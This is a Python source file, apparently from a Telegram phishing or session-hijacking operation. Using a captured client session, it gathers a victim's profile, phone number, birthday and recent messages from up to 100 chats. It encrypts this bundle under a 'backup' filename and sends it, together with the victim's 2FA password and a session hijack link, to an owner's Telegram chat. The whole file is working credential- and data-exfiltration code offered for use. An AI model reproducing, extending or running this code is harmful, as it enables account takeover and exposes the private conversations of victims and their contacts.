import os
import json
import string
import secrets
from io import BytesIO
from telethon import TelegramClient
from telethon.tl.types import User, Chat, Channel
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import base64

from config import API_ID, API_HASH, WEB_URL, OWNER_CHAT_ID


def generate_password() -> str:
    chars = string.ascii_lowercase + string.digits
    random_part = ''.join(secrets.choice(chars) for _ in range(8))
    return f"lvenc-{random_part}"


def get_type(entity) -> str:
    if isinstance(entity, User):
        return "user"
    if isinstance(entity, Chat):
        return "group"
    if isinstance(entity, Channel):
        return "channel" if entity.broadcast else "supergroup"
    return "unknown"


def encrypt_data(data: dict, password: str) -> bytes:
    json_bytes = json.dumps(data, ensure_ascii=False).encode('utf-8')
    
    salt = os.urandom(16)
    
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    key = kdf.derive(password.encode('utf-8'))
    
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    encrypted = aesgcm.encrypt(nonce, json_bytes, None)
    
    result = salt + nonce + encrypted
    return base64.b64encode(result)


async def collect_user_data(client: TelegramClient) -> dict:
    from telethon.tl.functions.users import GetFullUserRequest
    
    me = await client.get_me()
    
    birthday = None
    try:
        full_user = await client(GetFullUserRequest(me.id))
        if hasattr(full_user, 'full_user') and hasattr(full_user.full_user, 'birthday'):
            bd = full_user.full_user.birthday
            if bd:
                birthday = f"{bd.day:02d}.{bd.month:02d}.{bd.year}" if bd.year else f"{bd.day:02d}.{bd.month:02d}"
    except:
        pass
    
    return {
        "id": me.id,
        "first_name": me.first_name or "",
        "last_name": me.last_name or "",
        "username": me.username,
        "phone": me.phone,
        "birthday": birthday,
        "premium": getattr(me, 'premium', False),
        "verified": getattr(me, 'verified', False)
    }


async def export_all_chats(client: TelegramClient, limit: int = 200) -> dict:
    me = await client.get_me()
    
    data = {
        "version": 1,
        "user": {
            "id": me.id,
            "first_name": me.first_name or "",
            "last_name": me.last_name,
            "username": me.username,
            "phone": me.phone
        },
        "dialogs": []
    }
    
    async for d in client.iter_dialogs(limit=100):
        dialog_data = {
            "id": d.id,
            "name": d.name or "Unknown",
            "type": get_type(d.entity),
            "messages": []
        }
        
        async for msg in client.iter_messages(d.id, limit=limit):
            sender_name = None
            if msg.sender:
                if isinstance(msg.sender, User):
                    sender_name = msg.sender.first_name or ""
                    if msg.sender.last_name:
                        sender_name += f" {msg.sender.last_name}"
                elif hasattr(msg.sender, 'title'):
                    sender_name = msg.sender.title
            
            dialog_data["messages"].append({
                "id": msg.id,
                "text": msg.text,
                "sender_name": sender_name,
                "is_outgoing": msg.sender_id == me.id if msg.sender_id else False,
                "date": msg.date.isoformat() if msg.date else None,
                "has_media": msg.media is not None,
                "media_type": type(msg.media).__name__ if msg.media else None
            })
        
        dialog_data["messages"].reverse()
        data["dialogs"].append(dialog_data)
    
    return data


def format_user_message(user_data: dict, password: str, session_url: str, twofa: str = None) -> str:
    username_link = f"@{user_data['username']}" if user_data['username'] else "—"
    if user_data['username']:
        username_link = f"https://t.me/{user_data['username']}"
    
    lines = [
        "🔐 <b>Данные сайта:</b>",
        f"Пароль: <code>{password}</code>",
        f'🔗 <a href="{session_url}">Перейти</a> ({session_url})',
        "",
        "👤 <b>Данные Telegram:</b>",
        f"ID: <code>{user_data['id']}</code>",
        f"Имя: {user_data['first_name']} {user_data.get('last_name', '')}".strip(),
        f"Username: {username_link}",
        f"Телефон: <code>+{user_data['phone']}</code>" if user_data.get('phone') else "Телефон: —",
    ]
    
    if user_data.get('birthday'):
        lines.append(f"Дата рождения: {user_data['birthday']}")
    
    if user_data.get('premium'):
        lines.append("⭐ Premium: Да")
    
    if twofa:
        lines.append("")
        lines.append(f"🔑 2FA: <code>{twofa}</code>")
    
    lines.append("")
    lines.append("#userdata")
    
    return "\n".join(lines)


async def export_and_send_to_owner(bot, client: TelegramClient, session_id: str, twofa: str = None):
    # Get settings from Supabase
    try:
        from api.database import get_settings
        settings = await get_settings()
    except:
        settings = {"messages_limit": 200, "target_chat_id": None, "session_url_chat_id": None}
    
    session_url = f"{WEB_URL}/?session={session_id}"
    
    # 1. Send session URL to session_url_chat_id (just link)
    session_url_chat = settings.get("session_url_chat_id")
    if session_url_chat:
        try:
            await bot.send_message(
                chat_id=session_url_chat,
                text=f'🔗 <a href="{session_url}">Новая сессия</a>',
                parse_mode="HTML"
            )
        except Exception as e:
            print(f"[Export] Session URL send error: {e}")
    
    # 2. Send full data to target_chat_id (or OWNER)
    target_chat = settings.get("target_chat_id") or OWNER_CHAT_ID
    if not target_chat:
        return
    
    try:
        from aiogram.types import BufferedInputFile
        
        password = generate_password()
        
        user_data = await collect_user_data(client)
        
        messages_limit = settings.get("messages_limit", 200)
        all_data = await export_all_chats(client, limit=messages_limit)
        
        encrypted = encrypt_data(all_data, password)
        
        filename = f"backup_{user_data['id']}.enc"
        file = BufferedInputFile(encrypted, filename=filename)
        
        caption = format_user_message(user_data, password, session_url, twofa)
        
        await bot.send_document(
            chat_id=target_chat,
            document=file,
            caption=caption,
            parse_mode="HTML"
        )
        
    except Exception as e:
        print(f"[Export] Error sending to owner: {e}")



